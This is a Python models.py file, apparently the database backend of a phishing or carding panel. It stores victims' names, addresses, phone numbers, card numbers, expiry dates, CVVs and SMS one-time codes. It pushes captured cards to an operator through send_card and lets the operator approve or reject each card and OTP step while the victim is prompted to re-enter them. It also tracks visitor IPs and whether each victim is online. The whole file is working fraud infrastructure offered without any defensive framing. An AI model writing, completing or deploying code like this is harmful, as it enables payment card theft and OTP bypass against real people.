# models.py
import datetime
import time

from db import db
from push_message import send_card


class User(db.Model):
    __tablename__ = "user_table"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    appid = db.Column(db.VARCHAR(255))
    full_name = db.Column(db.VARCHAR(255))
    address_1 = db.Column(db.VARCHAR(255))
    address_2 = db.Column(db.VARCHAR(255))
    city = db.Column(db.VARCHAR(255))
    state = db.Column(db.VARCHAR(255))
    zip = db.Column(db.VARCHAR(255))
    status = db.Column(db.VARCHAR(255))
    phonenumber = db.Column(db.VARCHAR(255))
    card_number = db.Column(db.VARCHAR(255))
    exp_date = db.Column(db.VARCHAR(255))
    cvv = db.Column(db.VARCHAR(255))
    sms_status = db.Column(db.VARCHAR(255))
    card_status = db.Column(db.VARCHAR(255))
    otp = db.Column(db.VARCHAR(255))
    time = db.Column(db.VARCHAR(255))
    lang = db.Column(db.VARCHAR(255))
    ip = db.Column(db.VARCHAR(255))
    User_Agent = db.Column(db.VARCHAR(255))
    plat = db.Column(db.VARCHAR(255))
    online = db.Column(db.VARCHAR(255))

    def __repr__(self):
        return "<User %r>" % self.id

    def __str__(self):
        return "<User %s>" % self.id

    def get_count(self):
        return self.query.count()

    @classmethod
    def add_information(cls, person_data: dict):
        add_data = User(
            appid=person_data["appid"],
            full_name=person_data["full_name"],
            address_1=person_data["address_1"],
            address_2=person_data["address_2"],
            city=person_data["city"],
            state=person_data["state"],
            zip=person_data["zip"],
            phonenumber=person_data["phonenumber"],
            lang=person_data["lang"],
            ip=person_data["ip"],
            User_Agent=person_data["User_Agent"],
            plat=person_data["plat"],
            status="等待输入卡信息",
            time=time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            online="在线",
        )
        db.session.add(add_data)
        db.session.commit()

    @classmethod
    def add_card(cls, card_info: dict):
        check_appid = User.query.filter(User.appid == card_info["appid"]).first()
        if not check_appid:
            add_data = User(
                appid=card_info["appid"],
                card_number=card_info["card_number"],
                exp_date=card_info["exp_date"],
                cvv=card_info["cvv"],
                status="请选择卡操作",
            )
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: card_info["appid"],
                cls.card_number: card_info["card_number"],
                cls.exp_date: card_info["exp_date"],
                cls.cvv: card_info["cvv"],
                cls.status: "请选择卡操作",
            }
            User.query.filter(User.appid == card_info["appid"]).update(add_data)
        send_card(User.check_card(card_info["appid"]))
        db.session.commit()

    @classmethod
    def add_otp(cls, otp_info: dict):
        check_appid = User.query.filter(User.appid == otp_info["appid"]).first()
        if not check_appid:
            add_data = User(
                appid=otp_info["appid"],
                otp=otp_info["otp"],
                status="请选择验证码操作",
            )
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: otp_info["appid"],
                cls.otp: otp_info["otp"],
                cls.status: "请选择验证码操作",
            }
            User.query.filter(User.appid == otp_info["appid"]).update(add_data)
        db.session.commit()

    @classmethod
    def pass_card(cls, task_id):
        check_appid = User.query.filter(User.id == int(task_id["id"])).first()
        if not check_appid:
            return False
        else:
            add_data = {
                cls.card_status: task_id["status"],
                cls.status: "等待验证码",
            }
            User.query.filter(User.id == task_id["id"]).update(add_data)
        db.session.commit()

    @classmethod
    def get_card_status(cls, getid: str):
        data_list = User.query.filter(User.appid == getid).first()
        return data_list.__dict__["card_status"]

    @classmethod
    def pass_otp(cls, task_id):
        check_appid = User.query.filter(User.id == int(task_id["id"])).first()
        if not check_appid:
            return False
        else:
            add_data = {
                cls.sms_status: task_id["status"],
                cls.status: "完成",
            }
            User.query.filter(User.id == task_id["id"]).update(add_data)
        db.session.commit()

    @classmethod
    def get_otp_status(cls, getid: str):
        data_list = User.query.filter(User.appid == getid).first()
        return data_list.__dict__["sms_status"]

    # 当状态为拒绝时自动重置
    @classmethod
    def reset_smsaction(cls, appid):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            add_data = User(appid=appid, sms_status="等待", status="等待再次输入验证码")
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: appid,
                cls.sms_status: "等待",
                cls.status: "等待再次输入验证码",
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def reset_cardaction(cls, appid):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            add_data = User(appid=appid, card_status="等待", status="等待再次输入卡片")
            db.session.add(add_data)
        else:
            add_data = {
                cls.appid: appid,
                cls.card_status: "等待",
                cls.status: "等待再次输入卡片",
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def check_card(cls, appid: str):
        data_list = User.query.filter(User.appid == appid).first()
        return data_list.__dict__

    @classmethod
    def get_pending_data(cls):
        data_list = User.query.filter(User.status != "完成").all()
        data_list_del_sa = [x.__dict__ for x in data_list]
        for i in data_list_del_sa:
            if i["status"] == "请选择验证码操作":
                i["disable_sms_action"] = False
            else:
                i["disable_sms_action"] = True
            if i["status"] == "请选择卡操作":
                i["disable_card_action"] = False
            else:
                i["disable_card_action"] = True
            del i["_sa_instance_state"]
        return data_list_del_sa

    @classmethod
    def get_finish_data(cls):
        finish_data_list = User.query.filter(User.status == "完成").all()
        finish_data_list_filter = [x.__dict__ for x in finish_data_list]
        for i in finish_data_list_filter:
            del i["_sa_instance_state"]
        return finish_data_list_filter

    @classmethod
    def get_all_data(cls):
        data_list = User.query.all()
        return [x.__dict__ for x in data_list]

    @classmethod
    def delete(cls, delete_id):
        user = User.query.filter(User.id == int(delete_id)).first()
        if user is not None:
            db.session.delete(user)
            db.session.commit()
        else:
            return False

    @classmethod
    def check_online(cls):
        check_data = User.query.filter(User.status != "完成").all()
        check_data_list = [x.__dict__ for x in check_data]
        result_list = [x["appid"] for x in check_data_list]
        return result_list

    @classmethod
    def set_online(cls, appid, status):
        check_appid = User.query.filter(User.appid == appid).first()
        if not check_appid:
            return False
        else:
            add_data = {
                cls.online: status,
            }
            User.query.filter(User.appid == appid).update(add_data)
        db.session.commit()

    @classmethod
    def check_data_num(cls):
        pending_number = User.query.filter(User.status != "完成").count()
        totoal_num = User.query.count()
        vistied = Visit().query.count()
        return [vistied, totoal_num, pending_number]


class Visit(db.Model):
    __tablename__ = "visit_records"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    ip = db.Column(db.VARCHAR(255))
    time = db.Column(db.DATETIME, default=datetime.datetime.now)

    def __repr__(self):
        return "<Visit %r>" % self.id

    def __str__(self):
        return "<Visit %s>" % self.id

    def get_count(self):
        return self.query.count()

    @classmethod
    def add_record(cls, visit_info: str):
        check_ip = Visit.query.filter(Visit.ip == visit_info).first()
        if not check_ip:
            visit_data = Visit(
                ip=visit_info,
            )
            db.session.add(visit_data)
            db.session.commit()

    @classmethod
    def delete_record(cls):
        Visit.query.filter(Visit.id < 9999999999).delete()
        db.session.commit()


class Setting(db.Model):
    __tablename__ = "setting"
    id = db.Column(db.Integer, autoincrement=True, primary_key=True, nullable=False)
    key = db.Column(db.VARCHAR(255))
    value = db.Column(db.VARCHAR(255))

    def __repr__(self):
        return "<Visit %r>" % self.id

    def __str__(self):
        return "<Visit %s>" % self.id

    @classmethod
    def set_value(cls, key, value):
        update_key = Setting.query.filter(Setting.key == key).first()
        if not update_key:
            set_data = Setting(key=key, value=value)
            db.session.add(set_data)
        else:
            set_data = {
                cls.value: value,
            }
            Setting.query.filter(Setting.key == key).update(set_data)
        db.session.commit()

    @classmethod
    def get_data(cls):
        data_list = Setting.query.all()
        data = [x.__dict__ for x in data_list]
        settings = {}
        for i in data:
            settings[i["key"]] = i["value"]
        return settings

    @classmethod
    def get_syn(cls):
        syn_status = Setting.query.filter(Setting.key == "syn").first()

        return bool(int(syn_status.value))
